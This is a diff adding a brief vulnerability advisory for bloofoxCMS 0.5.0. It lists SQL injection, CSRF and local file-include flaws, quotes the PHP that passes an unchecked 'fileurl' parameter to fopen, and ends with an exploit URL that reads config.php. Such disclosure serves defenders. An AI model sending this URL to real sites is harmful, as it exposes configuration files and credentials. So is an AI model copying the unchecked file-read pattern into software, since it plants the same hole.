@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/65019/info
+   
+bloofoxCMS is prone to the following security vulnerabilities:
+   
+1. Multiple SQL-injection vulnerabilities
+2. Multiple cross-site request forgery vulnerabilities
+3. A local file-include vulnerability
+   
+Exploiting these issues could allow an attacker to execute arbitrary script codes, steal cookie-based authentication credentials, obtain sensitive information, execute arbitrary server-side script code or bypass certain security restrictions to perform unauthorized actions.
+   
+bloofoxCMS 0.5.0 is vulnerable; other versions may also be affected.
+ 
+VULNERABILITY
+##############
+/admin/include/inc_settings_editor.php (line 56-69)
+
+// show file
+if(isset($_POST["fileurl"])) {
+    $fileurl = $_POST["fileurl"];
+}
+if(isset($_GET["fileurl"])) {
+    $fileurl = "../".$_GET["fileurl"];
+}
+
+if(file_exists($fileurl)) {
+    $filelength = filesize($fileurl);
+    $readfile = fopen($fileurl,"r");
+    $file = fread($readfile,$filelength);
+    fclose($readfile);
+}
+
+
+
+#########
+EXPLOIT
+#########
+
+http://localhost/admin/index.php?mode=settings&page=editor&fileurl=config.php
